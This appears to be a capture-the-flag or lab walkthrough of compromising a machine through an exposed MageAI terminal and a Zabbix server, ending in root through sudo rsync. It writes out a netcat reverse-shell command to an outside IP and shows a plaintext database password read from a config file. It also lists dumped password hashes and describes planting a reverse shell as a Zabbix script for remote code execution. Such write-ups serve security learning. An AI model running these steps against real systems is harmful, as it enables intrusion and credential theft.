ports 22, 80, 6789 open
80 is default apache page

6789 is some MageAI port, which has a direct terminal as www-data to the machine
cant paste in it, though
So, we give ourselves a shell from there, using
`busybox nc 192.168.45.194 22 -e /bin/bash`

---
www-data!
ps -ef shows a lot of zabbix_server commands running
one specific command helps us
`/usr/sbin/zabbix_server -c /etc/zabbix/zabbix_server.conf`
We're not allowed to read zabbix_server.conf file itself, but /etc/zabbix had a zabbix.conf.php file, from which we got
```
$DB['TYPE']			= 'MYSQL';
$DB['SERVER']			= 'localhost';
$DB['PORT']			= '0';
$DB['DATABASE']			= 'zabbix';
$DB['USER']			= 'zabbix';
$DB['PASSWORD']			= 'breadandbuttereater121';
```
`ss -tulpn | grep -E '(127.0.0.1:|::1:)'` confirms 3306 mysql is listening internally

`mysql -h 127.0.0.1 -u zabbix -D zabbix -p` and we get
```
Admin    | $2y$10$KA6iPN5sY5.Z4KLerN7XOOO1P7jR8MD2e0SqNRXOsJjV1b.8c5Si. |
guest    | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
```
Admin --> dinosaur
couldnt su to any user

HINT TAKEN : zabbix is running on port80/zabbix with web portal, and dinosaur is the password. We need to find a way to get rce from the zabbix website.

To access the port locally, and since the user www-data is not ssh-enabled, we use remote port forwarding. i.e ssh from target machine. but my kali config doesnt allow ssh
Tried setting up ssh for www-data, but that doesnt work either
So, ligolo

visit http://240.0.0.1/zabbix/ and we see the web portal
Login with Admin:dinosaur
go to alerts->scripts --> add script
Manual host action’ for the Scope, ‘script’ for the Type, and execute on ‘Zabbix server’, then enter a bash reverse shell in the ‘Commands’ section

Now, go to Monitoring -> hosts --> click on Zabbix server -> click the script we created
we get the reverse shell as zabbix!

---
sudo -l shows we can run rsync as zabbix
gtfo, root!

---
---
---
```bash
curl http://localhost/zabbix -L
```
-L auto-redirects whatever 301 ish redirects are.